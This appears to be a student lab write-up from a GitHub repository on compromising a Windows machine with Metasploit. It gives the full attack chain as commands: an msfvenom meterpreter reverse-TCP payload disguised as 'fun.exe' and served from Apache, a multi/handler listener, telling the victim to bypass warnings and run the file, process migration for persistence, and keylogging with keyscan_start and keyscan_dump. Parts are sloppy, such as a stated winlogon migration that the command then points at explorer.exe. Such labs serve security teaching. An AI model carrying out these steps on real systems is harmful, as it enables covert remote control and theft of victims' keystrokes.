# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
Find the attackers ip address using ifconfig

## OUTPUT:
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![2out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/d53d9cce-a244-4c47-97f8-181a627f7091)

copy the fun.exe into the apache /var/www/html folder
![3out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/2b8ce543-5eb9-4f4b-9880-cc851dbbcf18)

Start apache server sudo systemctl apache2 start
![4out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/e6c149a3-dea5-4852-b75d-afb9f9a7ca7e)

Check the status of apache2

![5out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/49a76f26-c71b-4fe4-922b-2219298a80ff)
Invoke msfconsole:

OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler
![6out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/a60aa04d-7b21-49c5-85bc-1a1246d902d8)
set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![7out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/ee57294a-84c9-4a34-afa2-e8d9458397cd)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![8out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/8e787cd1-f158-4718-9991-903bef672d8c)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![9out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/f6ffb5bc-f557-4928-9adf-3795edc6a255)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![11out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/88831f45-eed5-454a-a7db-df6cbdb5c1ce)
keyscan_dump Shows the keystrokes captured so far
![12out](https://github.com/kiruthika512/Compromising-windows-using-Metasploit/assets/135616605/fefb0cb9-de53-4a15-9f6b-2b510d09598a)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
